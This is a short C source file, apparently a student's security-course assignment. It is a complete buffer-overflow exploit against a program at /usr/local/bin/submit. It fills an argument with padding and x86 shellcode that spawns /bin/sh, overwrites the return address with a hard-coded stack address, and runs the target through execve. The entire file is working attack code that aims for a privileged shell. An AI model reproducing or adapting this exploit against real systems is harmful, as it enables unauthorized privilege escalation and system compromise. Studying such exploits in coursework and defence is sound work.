//Patrick Wong
//20317267

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/submit"

int main(void)
{  
	int i, c;
	char *args[4];
	char *env[1];	
    char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";
	int slen = strlen(shellcode);

	char argkiller[174];
	c = 0;
	for(i = 0; i < 50; i++)
		argkiller[i] = 'A';
	for(i = 50; i < 50+slen; i++) {
		argkiller[i] = shellcode[c];
		c++;
	}
	for(i = 50+slen; i < 173; i++)
		argkiller[i] = 'A';
	argkiller[173] = '\0';
	argkiller[172] = '\xff';
	argkiller[171] = '\xbf';
	argkiller[170] = '\xdd';
	argkiller[169] = '\x35';


	args[0] = argkiller; args[1] = "-h"; 
	args[2] = "message"; args[3] = NULL;
	env[0] = NULL;
	
	if (execve(TARGET, args, env) < 0)
		fprintf(stderr, "execve failed.\n");
	exit(0);
}
